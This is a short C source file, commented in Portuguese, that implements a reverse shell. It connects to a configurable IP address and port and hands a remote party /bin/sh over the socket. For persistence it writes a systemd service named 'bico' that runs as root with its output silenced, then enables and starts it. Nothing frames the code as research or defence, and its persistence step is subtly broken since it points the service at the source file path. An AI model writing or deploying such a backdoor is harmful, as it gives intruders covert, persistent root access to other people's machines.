#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
    int sock;
    struct sockaddr_in addr;
    char buffer;
    const char *ip = "192.168.1.100"; // trocar ip
    int port = 4444; // trocar porta 

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Falha ao criar socket");
        return 1;
    }

    // endereçamento
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Falha ao conectar");
        return 1;
    }

    // Criação do systemd 
    FILE *file = fopen("/etc/systemd/system/bico.service", "w");
    if (file) {
        fprintf(file, "[Unit]\nDescription=bico service\nAfter=network.target\n\n");
        fprintf(file, "[Service]\nExecStart=%s\nRestart=always\nUser=root\nStandardOutput=null\nStandardError=null\nRestartSec=5\n\n", __FILE__);
        fprintf(file, "[Install]\nWantedBy=multi-user.target\n");
        fclose(file);
        
        system("systemctl daemon-reload");
        system("systemctl enable bico.service");
        system("systemctl start bico.service");
    }

    // Redirecionar a entrada/saída para o socket
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Executar shell
    execl("/bin/sh", "sh", NULL);

    return 0;
}
